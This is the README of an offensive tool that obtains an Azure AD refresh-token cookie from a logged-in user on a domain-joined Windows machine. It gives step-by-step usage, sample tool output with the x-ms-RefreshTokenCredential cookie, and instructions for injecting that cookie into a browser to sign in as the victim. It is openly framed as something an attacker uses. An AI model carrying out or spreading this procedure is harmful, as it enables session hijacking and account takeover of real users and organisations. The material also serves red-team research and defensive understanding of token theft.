# Overview
Obtains a refresh token for a AzureAD-authenticated Windows user (i.e. the machine is joined to AzureAD and a user logs in with their AzureAD account). An attacker can then use the token to authenticate to AzureAD as that user.


# Usage
1. Obtain access to a user context on an Azure-AD-joined device. An easy way to tell is to run the command `dsregcmd.exe /status`. If this is abuseable, there will be a section titled "SSO State" and `AzureAdPrt` will be set to YES.
2. Run RequestAADRefreshToken.exe
```
Requesting cookies for the following URIs: https://login.microsoftonline.com/
PID  : 37808

Uri: https://login.microsoftonline.com/
    Name      : x-ms-RefreshTokenCredential
    Flags     : 8256
    Data      : <...snip JWT...>; path=/; domain=login.microsoftonline.com; secure; httponly
    P3PHeader : CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"

DONE
```
3. Clear your browser cookies and go to https://login.microsoftonline.com/login.srf
4. F12 (Chrome dev tools) -> Application -> Cookies
5. Delete all cookies and then add one named `x-ms-RefreshTokenCredential` and set its value to the JSON Web Token(JWT) in the `Data` field that RequestAADRefreshToken.exe output
6. Refresh the page (or visit https://login.microsoftonline.com/login.srf again) and you'll be logged it

Note: Exploitation here is only against the browser. It's likely, however, that this can be used with other applications to access different resource (e.g. the AzureAD cmdlets).


# References
* https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#how-are-app-tokens-and-browser-cookies-protected
* https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#browser-sso-using-prt
* https://docs.microsoft.com/en-us/azure/active-directory/devices/troubleshoot-device-dsregcmd#sso-state
